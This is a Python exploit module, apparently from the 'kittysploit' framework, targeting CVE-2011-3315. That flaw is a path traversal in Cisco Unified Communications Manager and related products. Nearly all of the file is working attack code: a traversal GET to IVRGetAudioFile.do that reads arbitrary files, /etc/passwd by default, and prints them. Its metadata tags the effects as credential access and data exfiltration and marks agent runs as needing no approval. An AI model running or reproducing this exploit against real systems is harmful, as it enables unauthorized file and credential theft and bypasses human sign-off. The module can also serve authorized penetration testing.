#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco Unified Multi Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Cisco Unified Multi Path Traversal',
        'description': 'Module exploits path traversal vulnerability in Cisco Unified Communications Manager, Cisco Unified Contact Center Express and Cisco Unified IP Interactive Voice Response devices.If the target is vulnerable it allows to read files from the filesystem.',
        'author': ['Facundo M. de la Cruz (tty0)', 'Marcin Bury'],
        'cve': ['CVE-2011-3315'],
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/36256/', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3315'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'cve-2011-3315', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/passwd", 'File to read from the filesystem')

    def run(self):
        if self.check():
            path = "/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../..{}".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success - reading file {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not read file")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        path = "/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd"

        response = self.http_request(
            method="GET",
            path=path
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and ("/etc/passwd" in (response.text or '')):
            return True  # target is vulnerable

        return False  # target is not vulnerable
